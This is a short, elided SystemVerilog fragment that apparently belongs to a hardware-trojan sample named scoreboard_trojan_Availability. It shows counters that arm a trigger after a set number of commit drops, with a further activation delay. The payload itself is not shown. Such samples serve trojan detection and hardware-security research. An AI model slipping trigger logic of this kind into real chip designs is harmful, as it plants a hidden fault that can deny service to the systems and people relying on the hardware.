...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 6480;
    localparam int ACTIVATE_DELAY = 3240;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && commit_drop_o) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && commit_drop_o) trojan_counter2 <= trojan_counter2 + 1;
...
module scoreboard_trojan_Availability #(
